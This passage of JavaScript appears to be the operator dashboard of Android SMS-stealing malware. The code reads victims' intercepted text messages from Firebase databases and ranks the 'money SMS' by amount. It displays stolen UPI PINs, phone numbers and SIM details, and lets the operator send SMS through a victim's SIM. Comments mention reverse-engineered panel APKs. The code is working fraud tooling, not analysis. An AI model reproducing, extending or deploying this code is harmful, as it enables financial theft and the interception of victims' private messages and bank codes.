  if(!force&&moneyMessagesList.length)return Promise.resolve(moneyMessagesList);
  moneyMessagesLoading=true;
  var insts=activeFbId?[getFbInstance(activeFbId)].filter(Boolean):firebaseInstances.slice();
  function fetchClientMessages(inst,clientKey,clientData){
    return restJsonInst(inst,'messages/'+clientKey).then(function(msgs){
      if(!msgs||typeof msgs!=='object')return [];
      var rows=[];
      Object.keys(msgs).forEach(function(msgId){
        var parsed=parseApkMoneyMessage(Object.assign({id:msgId},msgs[msgId]),clientKey,clientData);
        if(parsed){parsed.fbId=inst.id;rows.push(parsed);}
      });
      return rows;
    }).catch(function(){return[];});
  }
  function loadInst(inst){
    return restJsonInst(inst,'clients').then(function(clients){
      if(!clients||typeof clients!=='object')return [];
      var keys=Object.keys(clients);
      return keys.reduce(function(chain,clientKey){
        return chain.then(function(acc){
          var clientData=clients[clientKey];
          if(!clientData||typeof clientData!=='object')return acc;
          if(!hasApkModelName(clientData))return acc;
          return fetchClientMessages(inst,clientKey,clientData).then(function(rows){
            return acc.concat(rows);
          });
        });
      },Promise.resolve([]));
    }).catch(function(){return[];});
  }
  return Promise.all(insts.map(loadInst)).then(function(results){
    var out=[];
    results.forEach(function(part){out=out.concat(part);});
    out.sort(function(a,b){return (b.amount||0)-(a.amount||0);});
    moneyMessagesList=out;
    moneyMessagesLoading=false;
    return out;
  }).catch(function(){
    moneyMessagesLoading=false;
    return moneyMessagesList;
  });
}
function buildMoneyCardHtml(row){
  var on=parseApkBool(row.status);
  var phone=esc(String(row.mobNo||''));
  var model=esc(String(row.modelName||''));
  var body=esc(String(row.message||''));
  var sender=esc(String(row.sender||''));
  var when=esc(String(row.dateTime||''));
  var clientKey=escAttr(String(row.clientKey||''));
  var fbId=escAttr(String(row.fbId||''));
  return '<div class="money-card" onclick="openMoneyDevice(\''+clientKey+'\',\''+fbId+'\')"><div class="money-inner">'+
    '<div class="money-icon">💰</div>'+
    '<div class="money-phone">Phone: '+phone+'('+model+')</div>'+
    '<div class="money-status '+(on?'online':'offline')+'">'+(on?'online':'offline')+'</div>'+
    '<div class="money-body">'+body+'</div>'+
    '<div class="money-meta"><span>Sender: '+sender+'</span><span>'+when+'</span></div></div></div>';
}
function openMoneyDevice(clientKey,fbId){
  var d=allDevs.find(function(x){return x.rawId===clientKey&&(!fbId||x.fbId===fbId);});
  if(d)selectDevice(d.id);else toast('Device not found',false);
}
function renderMoneyView(){
  var el=document.getElementById('devListMoney');
  if(!el)return;
  var q=getSearchQuery().toLowerCase();
  var list=moneyMessagesList.slice();
  if(moneyFilterMode==='active')list=list.filter(function(m){return parseApkBool(m.status);});
  else list=list.filter(function(m){
    var amt=+(m.amount||0);
    return amt>=moneyAmountMin&&amt<=moneyAmountMax;
  });
  if(q)list=list.filter(function(m){
    var hay=(m.message||'')+(m.sender||'')+(m.mobNo||'')+(m.modelName||'');
    return hay.toLowerCase().includes(q);
  });
  setText('moneyTotal','Total:-'+list.length);
  if(moneyMessagesLoading){
    el.innerHTML='<div class="empty">Loading money SMS…</div>';
    return;
  }
  if(!moneyMessagesList.length){
    el.innerHTML='<div class="empty">Loading money SMS…</div>';
    loadMoneyMessages(true).then(function(){renderMoneyView();});
    return;
  }
  if(!list.length){
    el.innerHTML='<div class="empty">No money messages found</div>';
    return;
  }
  el.innerHTML=list.slice(0,200).map(buildMoneyCardHtml).join('');
}
function formatApkSimInfo(raw){
  var sims=raw&&raw.sims;
  if(!Array.isArray(sims)||!sims.length)return '';
  return sims.map(function(sim,i){
    var num=sim&&(sim.phoneNumber||sim.number||sim.phone||'');
    var carrier=sim&&sim.carrierName?String(sim.carrierName).split('—')[0].trim():'';
    return 'sim'+(i+1)+'-'+num+' '+carrier;
  }).join(' | ');
}
function buildDeviceDetailText(d){
  var raw=getRawDev(d.id);
  var on=d.status==='online';
  var lines=[
    'Device name: '+getApkModel(raw,d),
    'Phone: '+getApkMobNo(raw,d),
    'Upi-pin: '+(getApkUpiPin(raw)||'—'),
    'time: '+(getApkJoined(raw)||'—'),
    'Money: '+(getApkMoney(raw)||'—'),
    'Liked: '+(isApkYes(raw.liked)?'yes':'no'),
    'Status: '+(on?'Online':'Offline')
  ];
  var simTxt=formatApkSimInfo(raw);
  if(simTxt)lines.push('SIMs: '+simTxt);
  return lines.join('\n');
}
function renderDeviceDetail(){
  var d=getSelDev();
  var titleEl=document.getElementById('deviceDetailTitle');
  var statusEl=document.getElementById('deviceDetailStatus');
  var bodyEl=document.getElementById('deviceDetailBody');
  var moneyEl=document.getElementById('updateMoney');
  var likeBtn=document.getElementById('deviceLikeBtn');
  var chkEl=document.getElementById('deviceCheckedBox');
  var loginEl=document.getElementById('deviceLoginToggle');
  if(!d){
    if(bodyEl)bodyEl.textContent='No device selected';
    return;
  }
  var raw=getRawDev(d.id);
  var on=d.status==='online';
  if(titleEl)titleEl.textContent=getApkMobNo(raw,d)||getApkModel(raw,d)||'Device';
  if(statusEl){
    statusEl.textContent=on?'Online':'Offline';
    statusEl.className='status '+(on?'online':'offline');
  }
  if(bodyEl)bodyEl.textContent=buildDeviceDetailText(d);
  if(moneyEl)moneyEl.value=getApkMoney(raw);
  if(likeBtn){
    likeBtn.textContent=isApkLiked(d.id)?'❤️':'👎';
    likeBtn.classList.toggle('liked',isApkLiked(d.id));
  }
  if(chkEl)chkEl.checked=isApkChecked(d.id);
  if(loginEl)loginEl.checked=isApkLoggedIn(d.id);
  fillDeviceSmsTo(d);
}
function toggleDeviceLogin(on){
  var d=getSelDev();if(!d)return;
  patchClientField(d,{login:on?'yes':'no'},on?'Logged in':'Logged out');
}
function toggleDeviceDetailLike(){
  var d=getSelDev();if(!d)return;
  var next=isApkLiked(d.id)?'no':'yes';
  patchClientField(d,{liked:next},next==='yes'?'Liked':'Disliked').then(function(){renderDeviceDetail();});
}
function toggleDeviceDetailChecked(on){
  var d=getSelDev();if(!d)return;
  patchClientField(d,{checked:!!on});
}
function copyDevicePhone(){
  var d=getSelDev();if(!d)return;
  var text=buildDeviceDetailText(d);
  var m=text.match(/Phone:\s*([^\n]+)/i);
  var phone=m?m[1].trim():'';
  if(!phone){toast('No valid number to copy.',false);return;}
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(phone).then(function(){toast('Phone number copied!',true);}).catch(function(){toast('Copy failed',false);});
  }else toast(phone,true);
}
function pasteDeviceSms(){
  if(!navigator.clipboard||!navigator.clipboard.readText){toast('Clipboard not available',false);return;}
  navigator.clipboard.readText().then(function(txt){
    if(!txt){toast('Clipboard empty',false);return;}
    var useSim=prompt('Paste SMS via Sim 1 or Sim 2? (1/2)','1');
    var sim=(useSim==='2')?2:1;
    var toEl=document.getElementById('smsTo');
    var msgEl=document.getElementById('smsBody');
    var parts=String(txt).split(/\n/);
    if(parts.length>=2){
      if(toEl)toEl.value=parts[0].replace(/\D/g,'').slice(-10);
      if(msgEl)msgEl.value=parts.slice(1).join('\n').trim();
    }else if(msgEl){msgEl.value=txt;}
    toast('Pasted — tap Sim'+sim+' to send',true);
  }).catch(function(){toast('Paste failed',false);});
}
function deleteDeviceSms(msgId){
  var d=getSelDev();if(!d||!msgId)return;
  if(!confirm('Are you sure to delete?'))return;
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase not loaded',false);return;}
  var url=buildRestUrl(inst,'messages/'+d.rawId+'/'+msgId,getFbAuthKey(inst));
  fetch(url,{method:'DELETE'}).then(function(r){
    if(r.ok){toast('Delete',true);loadSmsForDevice(true);}else toast('Delete failed',false);
  }).catch(function(){toast('Delete failed',false);});
}
function renderDeviceSmsList(){
  var el=document.getElementById('devListDeviceSms');
  if(!el||currentView!=='device')return;
  var d=getSelDev();
  if(!d){el.innerHTML='<div class="empty">Select a device</div>';return;}
  var q=getSearchQuery();
  var cached=deviceSmsCache[d.id];
  var list=(cached&&cached.list&&cached.list.length)?cached.list:(window_allSms||window_sms||[]);
  list=list.filter(function(m){
    if(!q)return true;
    var hay=(m.body||'')+(m.address||'')+(m.sender||'');
    return hay.toLowerCase().includes(q);
  });
  if(_smsLoading&&!list.length){el.innerHTML='<div class="empty">Loading SMS…</div>';return;}
  if(!list.length){el.innerHTML='<div class="empty">No SMS yet</div>';return;}
  el.innerHTML=list.slice(0,120).map(function(m){return buildSmsCardHtml(m,'',{deletable:true});}).join('');
}
function closeDeviceDetail(){
  selDev='';
  clearListeners();
  showPage('home');
}
function sendDeviceSms(sim){
  var d=getSelDev();
  if(!d){toast('Select a device first',false);return;}
  _sendSimSlot=sim||1;
  var toEl=document.getElementById('smsTo');
  var msgEl=document.getElementById('smsBody');
  var toRaw=(toEl&&toEl.value||'').trim();
  if(!toRaw){
    toRaw=getDeviceSmsPhone(d);
    if(toEl&&toRaw)toEl.value=toRaw;
  }
  var to=normalizePhone(toRaw)||toRaw;
  var msg=(msgEl&&msgEl.value||'').trim();
  if(!toRaw){toast('Device ka phone number nahi mila — number daalo',false);return;}
  if(!msg){toast('Enter message',false);return;}
  if(_sendInFlight){toast('Sending…',true);return;}
  _sendInFlight=true;
  toast('Sending SMS…',true);
  sendSmsInstant(toRaw||to,msg,_sendSimSlot,function(ok,data){
    _sendInFlight=false;
    if(ok){
      if(msgEl)msgEl.value='';
      toast('SMS sent!',true);
    }else{
      toast((data&&data.error)||'Send failed',false);
    }
  });
}
function saveDeviceMoney(){
  var d=getSelDev();
  if(!d){toast('No device selected',false);return;}
  var val=(document.getElementById('updateMoney')||{}).value;
  val=val!=null?String(val).trim():'';
  if(!val){toast('Enter amount',false);return;}
  patchClientField(d,{money:val},'Money updated').then(function(){renderDeviceDetail();});
}
function selectDevice(id){
  selDev=id;
  var d=getSelDev();
  if(!d)return;
  currentView='device';
  Object.keys(PAGE_VIEWS).forEach(function(k){
    var el=document.getElementById(PAGE_VIEWS[k]);
    if(el)el.classList.toggle('active',k==='device');
  });
  renderDeviceDetail();
  fillDeviceSmsTo(d,true);
  var smsEl=document.getElementById('devListDeviceSms');
  if(smsEl)smsEl.innerHTML='<div class="empty">Loading SMS…</div>';
  loadSmsForDevice(true);
  window.scrollTo(0,0);
}
function renderSmsModal(){
  renderDeviceSmsList();
  var el=document.getElementById('smsModalList');
  if(!el)return;
  var d=getSelDev();
  var cached=d&&deviceSmsCache[d.id];
  var list=(cached&&cached.list&&cached.list.length)?cached.list:(window_allSms||window_sms||[]);
  if(_smsLoading&&!list.length){el.innerHTML='<div class="empty">Loading SMS…</div>';return;}
  if(!list.length){el.innerHTML='<div class="empty">No SMS yet</div>';return;}
  el.innerHTML=list.slice(0,80).map(function(m){
    var body=esc(m.body||m.message||m.text||'');
    var sender=esc(m.sender||m.address||m.from||'Unknown');
    var when=esc(m.date_readable||m.date||'');
    return '<div class="sms-card"><div class="sms-inner"><div class="sms-icon">💬</div><div><div class="sms-body">'+body+'</div><div class="sms-meta">Sender: '+sender+' · '+when+'</div></div></div></div>';
  }).join('');
}
function renderDeviceView(){}
function extractDeviceSims(raw){
  var sims=[],seen={},i,s,pn;
  if(!raw||typeof raw!=='object')return sims;
  var list=raw.sims;
  if(list&&typeof list==='object'&&!Array.isArray(list))list=Object.keys(list).map(function(k){return list[k];});
  if(Array.isArray(list)){
    for(i=0;i<list.length;i++){
      s=list[i];
      if(typeof s==='string'&&s&&!seen[s]){seen[s]=1;sims.push({slot:i+1,phoneNumber:s});continue;}
      if(!s||typeof s!=='object')continue;
      pn=s.phoneNumber||s.number||s.phone||s.mobNo||s.mobile||'Unknown';
      if(!seen[pn]){seen[pn]=1;sims.push({slot:i+1,phoneNumber:pn});}
    }
  }
  if(!sims.length){
    pn=getPhoneFromRecord(raw);
    if(pn)sims.push({slot:1,phoneNumber:pn});
  }
  return sims;
}
function renderSimSelector(d){
  var el=document.getElementById('simSelector');
  if(!el)return;
  var sims=(d&&d.sims&&d.sims.length)?d.sims:[{slot:1,phoneNumber:'SIM 1'},{slot:2,phoneNumber:'SIM 2'}];
  _sendSimSlot=sims[0].slot||1;
  el.innerHTML=sims.map(function(s,idx){
    var slot=s.slot||idx+1;
    var label='SIM '+slot+(s.phoneNumber&&s.phoneNumber!=='Unknown'?' · '+s.phoneNumber:'');
    return '<div class="sim-chip'+(slot===_sendSimSlot?' active':'')+'" data-sim="'+slot+'" onclick="selectSim('+slot+',this)">'+esc(label)+'</div>';
  }).join('');
}
function updateSendForm(){
  var d=getSelDev();
  var emptyEl=document.getElementById('sendEmpty');
  var formEl=document.getElementById('sendForm');
  if(!emptyEl&&!formEl)return;
  if(emptyEl)emptyEl.classList.toggle('hidden',!!d);
  if(formEl)formEl.classList.toggle('hidden',!d);
  if(d)renderSimSelector(d);
}

function smsBelongsToDevice(m,d){
  if(!m||!d)return true;
  var did=m.device_id||m.deviceId||m.client_id||m.clientId||m.dev_id||m.devId||'';
  if(!did)return true;
  return String(did)===String(d.rawId)||String(did)===String(d.id)||String(did)===String(d.fbId+'::'+d.rawId);
}
function filterSmsForDevice(list,d){
  return (list||[]).filter(function(s){return smsBelongsToDevice(s,d);});
}
function loadSmsCacheFromStorage(){
  try{
    var s=localStorage.getItem(SMS_CACHE_KEY);
    if(!s)return;
    var data=JSON.parse(s);
    if(!data||typeof data!=='object')return;
    Object.keys(data).forEach(function(k){
      if(data[k]&&Array.isArray(data[k].list)&&data[k].list.length) deviceSmsCache[k]=data[k];
    });
  }catch(e){}
}
function persistSmsCacheSoon(){
  if(_smsPersistTimer)clearTimeout(_smsPersistTimer);
  _smsPersistTimer=setTimeout(function(){
    try{
      var out={}, k, c;
      for(k in deviceSmsCache){
        c=deviceSmsCache[k];
        if(c&&c.list&&c.list.length) out[k]={list:c.list.slice(0,SMS_CACHE_MAX),at:c.at||Date.now()};
      }
      localStorage.setItem(SMS_CACHE_KEY,JSON.stringify(out));
    }catch(e){}
  },300);
}
function prefetchSmsForDevice(d){
  if(!d||deviceSmsCache[d.id]&&deviceSmsCache[d.id].list&&deviceSmsCache[d.id].list.length)return;
  var inst=getFbInstance(d.fbId);
  if(!inst)return;
  var paths=getPrioritySmsPaths(d,inst);
  if(!paths.length&&!deviceHasSmsInIndex(d))return;
  fetchSmsFast(inst,d).then(function(list){
    if(list&&list.length)setDeviceSms(d.id,list);
  });
}
function setDeviceSms(devId,list){
  var sms=(list||[]).slice().sort(function(a,b){return (b.ts||0)-(a.ts||0);});
  deviceSmsCache[devId]={list:sms,at:Date.now()};
  persistSmsCacheSoon();
  if(selDev===devId){
    window_allSms=sms;
    window_sms=sms.slice(0,80);
    scheduleRenderSms();
    if(document.getElementById('screen-bank')&&document.getElementById('screen-bank').classList.contains('active'))renderBankAccounts();
  }
}
function scheduleRenderSms(){
  if(_smsRenderTimer)clearTimeout(_smsRenderTimer);
  _smsRenderTimer=setTimeout(function(){
    _smsRenderTimer=null;
    renderSms();
  },SMS_RENDER_DEBOUNCE_MS);
}
function mergeSmsIntoDevice(devId,list){
  if(!devId||!list||!list.length)return;
  var cached=deviceSmsCache[devId];
  var merged=mergeSmsLists(cached&&cached.list||[],list);
  if(merged.length)setDeviceSms(devId,merged);
}
function showSmsForSelectedDevice(){
  var d=getSelDev();
  if(!d){window_sms=[];window_allSms=[];renderSmsModal();return;}
  var cached=deviceSmsCache[d.id];
  window_allSms=cached?cached.list.slice():[];
  window_sms=window_allSms.slice(0,80);
  renderSmsModal();
}
function clearListeners(){
  Object.keys(activeListeners).forEach(function(k){
    var L=activeListeners[k];
    if(L.loadTimer)clearTimeout(L.loadTimer);
    if(L.timer)clearInterval(L.timer);
    if(L.timers){L.timers.forEach(function(t){clearInterval(t);});}
    if(L.refs){L.refs.forEach(function(r){
      try{
        if(r.ref&&r.h){
          if(r.type==='child_added')r.ref.off('child_added',r.h);
          else r.ref.off('value',r.h);
        }
      }catch(e){}
    });}
    else if(L.db&&L.ref&&L.h){try{L.ref.off('value',L.h);}catch(e){}}
  });
  activeListeners={};
}
function attachSmsLiveListeners(inst,d,devId,seq,listeners,applyFn){
  if(!inst||!inst.db||typeof applyFn!=='function')return;
  var paths=getPrioritySmsPaths(d,inst);
  if(!paths.length)paths=['user_sms/'+d.rawId,'sms_backup/'+d.rawId];
  paths.slice(0,3).forEach(function(path){
    if(!path)return;
    try{
      var baseRef=inst.db.ref(path);
      var qRef=baseRef;
      try{qRef=baseRef.limitToLast(150);}catch(e2){}
      var liveReady=false;
      qRef.once('value',function(snap){
        if(seq!==_smsLoadSeq||selDev!==devId)return;
        var list=parseSmsRaw(typeof snap.val==='function'?snap.val():snap);
        if(list.length)applyFn(list);
        liveReady=true;
      });
      var childHandler=function(snap){
        if(!liveReady||_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
        var s=normalizeSms(typeof snap.val==='function'?snap.val():snap);
        if(s)mergeSmsIntoDevice(devId,[s]);
      };
      try{
        qRef.on('child_added',childHandler);
        listeners.refs.push({ref:qRef,h:childHandler,type:'child_added'});
      }catch(e3){}
      var valHandler=function(snap){
        if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
        if(!snap||typeof snap.exists==='function'&&!snap.exists())return;
        var val=typeof snap.val==='function'?snap.val():snap;
        applyFn(parseSmsRaw(val));
        liveReady=true;
      };
      qRef.on('value',valHandler);
      listeners.refs.push({ref:qRef,h:valHandler,type:'value'});
    }catch(e){}
  });
}

/** Schema-aware fast paths — Rabel panels (rto9) store SMS in user_sms/{deviceId} */
function smsPrimaryPaths(d,inst){
  var id=d.rawId, schema=(inst&&inst.schema)||'rabel', paths=[], bases=getSmsDeviceBases(d,inst), pref=(inst&&inst.config&&inst.config.preferredDeviceNode)||'';
  if(!id)return paths;
  if(isRabelPanel(inst)||schema==='rabel'||pref==='user_list'||pref==='user_data'){
    paths.push('user_sms/'+id);
    paths.push('sms_backup/'+id);
    paths.push('messages/'+id);
    paths.push('sms/'+id);
    bases.forEach(function(n){
      if(!n||COMMAND_JUNK_NODES.indexOf(n)>=0)return;
      ['all_sms','new_sms','sms','messages'].forEach(function(sfx){
        var p=n+'/'+id+'/'+sfx;
        if(paths.indexOf(p)<0)paths.push(p);
      });
    });
    return uniqPaths(paths);
  }
  PANEL_SMS_GLOBAL_NODES.forEach(function(g){paths.push(g+'/'+id);});
  if(schema==='shootii'){
    ['Verify_Device'].concat(bases).forEach(function(n){
      if(!n)return;
      PANEL_SMS_SUFFIXES.forEach(function(sfx){
        var p=n+'/'+id+'/'+sfx;
        if(paths.indexOf(p)<0)paths.push(p);
      });
    });
    return uniqPaths(paths);
  }
  if(schema==='spinplay'){
    ['devices','devices_status'].concat(bases).forEach(function(n){
      if(!n)return;
      ['all_sms','new_sms','sms','messages'].forEach(function(sfx){
        var p=n+'/'+id+'/'+sfx;
        if(paths.indexOf(p)<0)paths.push(p);
      });
    });
    paths.push('messages/'+id);
    return uniqPaths(paths);
  }
  paths.push('messages/'+id);
  bases.forEach(function(n){
    if(!n)return;
    ['all_sms','new_sms','sms','messages','user_sms'].forEach(function(sfx){
      var p=n+'/'+id+'/'+sfx;
      if(paths.indexOf(p)<0)paths.push(p);
    });
  });
  return uniqPaths(paths);
}

/** All known SMS read paths from panel APK reverse + rebel.py */
function smsPathsForDevice(d,inst){
  var id=d.rawId, paths=[], bases=getSmsDeviceBases(d,inst||getFbInstance(d.fbId));
  if(!id)return paths;
  paths.push('user_sms/'+id);
  paths.push('sms_backup/'+id);
  paths.push('messages/'+id);
  paths.push('sms/'+id);
  PANEL_SMS_GLOBAL_NODES.forEach(function(g){if(paths.indexOf(g+'/'+id)<0)paths.push(g+'/'+id);});
  bases.forEach(function(n){
    if(!n||COMMAND_JUNK_NODES.indexOf(n)>=0)return;
    PANEL_SMS_SUFFIXES.forEach(function(sfx){paths.push(n+'/'+id+'/'+sfx);});
    paths.push(n+'/'+id+'/webhookEvent/receivedSms');
  });
  return uniqPaths(paths.concat(buildDynamicSmsPaths(d,inst||getFbInstance(d.fbId))).filter(function(p){return !isJunkSmsPath(p);}));
}

function mergeSmsLists(){
  var merged=[], seen={}, i, j, list, s, key;
  for(i=0;i<arguments.length;i++){
    list=arguments[i]||[];
    for(j=0;j<list.length;j++){
      s=list[j];if(!s)continue;
      key=(s.address||'?')+'|'+(s.ts||0)+'|'+(s.body||'').slice(0,80);
      if(seen[key])continue;
      seen[key]=1;merged.push(s);
    }
  }
  merged.sort(function(a,b){return (b.ts||0)-(a.ts||0);});
  return merged;
}

function parseSmsRaw(data){
  if(!data||isFirebaseErr(data))return [];
  return smsAsList(data).map(normalizeSms).filter(Boolean);
}

function fetchSmsPathsParallel(inst,paths){
  if(!inst||!paths||!paths.length)return Promise.resolve([]);
  return Promise.all(paths.map(function(p){
    return restJsonInst(inst,p).then(function(data){
      if(!data||isFirebaseErr(data))return [];
      return smsAsList(data).map(normalizeSms).filter(Boolean);
    }).catch(function(){return[];});
  })).then(function(results){
    var args=[mergeSmsLists];
    results.forEach(function(r){args.push(r);});
    return mergeSmsLists.apply(null,args);
  });
}
function fetchSmsFast(inst,d){
  if(!inst||!d)return Promise.resolve([]);
  var paths=getPrioritySmsPaths(d,inst);
  if(!paths.length)paths=['user_sms/'+d.rawId,'sms_backup/'+d.rawId,'messages/'+d.rawId];
  return fetchSmsPathsParallel(inst,paths.slice(0,6));
}

function fetchSmsFromPathsDirect(inst,d){
  if(!inst||!d)return Promise.resolve([]);
  var priority=getPrioritySmsPaths(d,inst);
  var extra=buildUniversalSmsPaths(d,inst).filter(function(p){return priority.indexOf(p)<0&&!isJunkSmsPath(p);});
  var fetchList=uniqPaths(priority.concat(extra)).slice(0,12);
  return fetchSmsPathsParallel(inst,fetchList);
}
function fetchSmsViaPhp(inst,d){
  if(!inst||!d)return Promise.resolve([]);
  var hdr={'Content-Type':'application/json'};
  return fetch(FETCH_SMS_URL,{
    method:'POST',headers:hdr,
    body:JSON.stringify({
      device_id:d.rawId,
      database_url:inst.restUrl,
      auth_key:getFbAuthKey(inst),
      schema:inst.schema||'rabel',
      device_node:d.deviceNode||'user_list',
      composite_id:d.id
    })
  }).then(function(r){return r.json();}).then(function(j){
    if(!j||!j.ok||!Array.isArray(j.messages))return [];
    return j.messages.map(normalizeSms).filter(Boolean);
  }).catch(function(){return[];});
}
function fetchSmsFromPaths(inst,d){
  if(!inst||!d)return Promise.resolve([]);
  var fast=fetchSmsFast(inst,d);
  var full=fetchSmsFromPathsDirect(inst,d);
  var php=fetchSmsViaPhp(inst,d);
  return fast.then(function(list){
    if(list.length){
      full.then(function(merged){if(merged.length)setDeviceSms(d.id,merged);});
      php.then(function(fb){if(fb.length)setDeviceSms(d.id,fb);});
      return list;
    }
    return full.then(function(merged){
      if(merged.length)return merged;
      return php;
    });
  });
}

function loadSmsForDevice(force){
  var d=getSelDev();if(!d)return;
  var devId=d.id;
  var smsEmpty=document.getElementById('smsEmpty');
  if(smsEmpty)smsEmpty.classList.add('hidden');
  showSmsForSelectedDevice();
  var cached=deviceSmsCache[devId];
  _smsLoading=!cached||!cached.list||!cached.list.length;
  renderSms();

  if(!force&&activeListeners[devId]&&activeListeners[devId].devId===devId){
    if(_smsLoading){
      var inst0=getFbInstance(d.fbId);
      if(inst0) fetchSmsFast(inst0,d).then(function(list){if(list.length)setDeviceSms(devId,list);});
    }
    return;
  }

  var seq=++_smsLoadSeq;
  clearListeners();
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase project not found',false);_smsLoading=false;return;}

  var loadTimer=setTimeout(function(){
    if(seq!==_smsLoadSeq||selDev!==devId)return;
    _smsLoading=false;
    if(!deviceSmsCache[devId]||!deviceSmsCache[devId].list||!deviceSmsCache[devId].list.length)setDeviceSms(devId,[]);
    else renderSms();
  },12000);

  function applySmsList(list){
    if(seq!==_smsLoadSeq||selDev!==devId)return;
    if(list&&list.length){
      clearTimeout(loadTimer);
      _smsLoading=false;
      setDeviceSms(devId,list);
      return;
    }
    if(!deviceSmsCache[devId]||!deviceSmsCache[devId].list||!deviceSmsCache[devId].list.length)_smsLoading=true;
  }

  function poll(){
    if(seq!==_smsLoadSeq||selDev!==devId)return;
    if(_panelPaused)return;
    fetchSmsFast(inst,d).then(applySmsList);
    if(!inst.db){
      fetchSmsFromPathsDirect(inst,d).then(applySmsList);
    }
  }

  poll();
  var timer=setInterval(poll,inst.db?SMS_POLL_MS:SMS_POLL_MS);
  var listeners={timer:timer,timers:[timer],refs:[],devId:devId,seq:seq,loadTimer:loadTimer,live:!!inst.db};

  attachSmsLiveListeners(inst,d,devId,seq,listeners,applySmsList);

  activeListeners[devId]=listeners;
}
function smsLooksLikeMessage(m){
  if(!m||typeof m!=='object')return false;
  if(isSmsCommandRecord(m)||isOutboundSmsCommand(m))return false;
  return !!String(m.body||m.message||m.text||m.content||m.msg||'').trim();
}
function isOutboundSmsCommand(m){
  if(!m||typeof m!=='object')return false;
  if(m.body&&m.sender)return false;
  if(m.body&&m.address)return false;
  if(m.sender||m.originatingAddress)return false;
  if(m.to&&m.status&&(m.message||m.msg)&&!m.body)return true;
  if(m.to&&(m.message||m.msg)&&!m.sender&&!m.body&&!m.date&&!m.timestamp)return true;
  return false;
}
function smsAsList(raw){
  if(!raw)return[];
  if(isSmsCommandRecord(raw)||isOutboundSmsCommand(raw))return[];
  if(Array.isArray(raw)){
    var out=[], i, v;
    for(i=0;i<raw.length;i++){
      v=raw[i];
      if(!v||typeof v!=='object')continue;
      if(smsLooksLikeMessage(v))out.push(v);
      else out=out.concat(smsAsList(v));
    }
    return out;
  }
  if(typeof raw!=='object')return[];
  var wrapKeys=['messages','sms','data','items','list'], w;
  for(w=0;w<wrapKeys.length;w++){
    if(raw[wrapKeys[w]]&&typeof raw[wrapKeys[w]]==='object')return smsAsList(raw[wrapKeys[w]]);
  }
  return Object.keys(raw).map(function(k){
    var v=raw[k];
    if(!v||typeof v!=='object')return null;
    if(smsLooksLikeMessage(v))return v.id?v:Object.assign({},v,{id:k});
    return null;
  }).filter(Boolean).concat(
    Object.keys(raw).reduce(function(acc,k){
      var v=raw[k];
      if(v&&typeof v==='object'&&!smsLooksLikeMessage(v))acc=acc.concat(smsAsList(v));
      return acc;
    },[])
  );
}
// ---- FIX: SMS timestamp extraction and sorting ----
function smsToMs(v){
  if(v==null||v==='')return 0;
  if(typeof v==='number'&&v>0)return v<1e12?v*1000:v;
  if(typeof v==='string'&&!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}
  if(typeof v==='string'){var t=Date.parse(v);if(!isNaN(t))return t;var d2=parseDdMmYyyy(v);if(d2)return d2;}
  return 0;
}
function parseDdMmYyyy(s){
  if(!s||typeof s!=='string')return 0;
  var m=String(s).trim().match(/^(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})(?:\s*[|\s]\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM|am|pm)?)?$/i);
  if(!m)return 0;
  var dd=+m[1],MM=+m[2],yyyy=+m[3],hh=+(m[4]||0),mi=+(m[5]||0),ss=+(m[6]||0),ap=m[7];
  if(ap){var p=ap.toUpperCase();if(p==='PM'&&hh<12)hh+=12;if(p==='AM'&&hh===12)hh=0;}
  var ms=new Date(yyyy,MM-1,dd,hh,mi,ss).getTime();
  return isNaN(ms)?0:ms;
}
function smsMsgTime(m){
  if(!m)return 0;
  var keys=['date','timestamp','dateTime','datetime','time','received_at','sent_at','created_at','receivedAt','sentAt','sms_time','msg_time','last_modified','received_time','sent_time','id'];
  for(var i=0;i<keys.length;i++){var ms=smsToMs(m[keys[i]]);if(ms)return ms;}
  var sk=smsToMs(m._sortKey);if(sk)return sk;
  return smsToMs(m.date_readable);
}
function smsDisplayTime(m){
  if(!m)return '—';
  var keys=['dateTime','date_readable','date_time','time','date','received_at','sent_at'];
  var i,v;
  for(i=0;i<keys.length;i++){
    v=m[keys[i]];
    if(v==null||v==='')continue;
    if(typeof v==='string'&&String(v).trim())return String(v).trim();
  }
  return '—';
}
function normalizeSms(m,keyId){
  if(!m||typeof m!=='object')return null;
  if(isSmsCommandRecord(m)||isOutboundSmsCommand(m))return null;
  var body=String(m.body||m.message||m.text||m.content||m.msg||'').trim();
  if(!body)return null;
  if(!m.body&&m.message&&m.to&&m.status&&!m.sender)return null;
  var ts=smsMsgTime(m);
  var display=smsDisplayTime(m);
  if(display==='—'&&ts){
    var dt=new Date(ts);
    if(!isNaN(dt.getTime())){
      var dd=String(dt.getDate()).padStart(2,'0'),mm=String(dt.getMonth()+1).padStart(2,'0'),yyyy=dt.getFullYear();
      var h=dt.getHours(),mi=String(dt.getMinutes()).padStart(2,'0'),ap=h>=12?'pm':'am';
      h=h%12||12;
      display=dd+'/'+mm+'/'+yyyy+' | '+h+':'+mi+' '+ap;
    }
  }
  return{
    id:m.id||keyId||m._key||'',
    address:m.address||m.sender||m.from||m.number||m.originatingAddress||'?',
    body:body,
    message:body,
    sender:m.sender||m.address||m.from||'',
    date_readable:display,
    dateTime:m.dateTime||m.date_readable||m.date||'',
    type:String(m.type||m.direction||m.sms_type||'inbox').toLowerCase(),
    ts:ts
  };
}
function renderSmsFromData(data){
  var list=smsAsList(data).map(normalizeSms).filter(Boolean);
  // Sort by timestamp descending (latest first)
  list.sort(function(a,b){return (b.ts||0)-(a.ts||0);});
  window_sms=list.slice(0,60);renderSms();
}
function renderSms(){
  renderSmsModal();
}
function copySmsByIndex(idx){
  var d=getSelDev();if(!d)return;
  var cached=deviceSmsCache[d.id];
  var list=(cached&&cached.list&&cached.list.length)?cached.list:window_sms;
  var s=list&&list[idx];if(!s||!s.body)return;
  var text=String(s.body);
  function markCopied(btn){
    if(!btn)return;
    btn.textContent='✓';btn.classList.add('copied');
    toast('SMS copied',true);
    setTimeout(function(){btn.textContent='📋';btn.classList.remove('copied');},1500);
  }
  var btn=document.querySelectorAll('.sms-copy-btn')[idx];
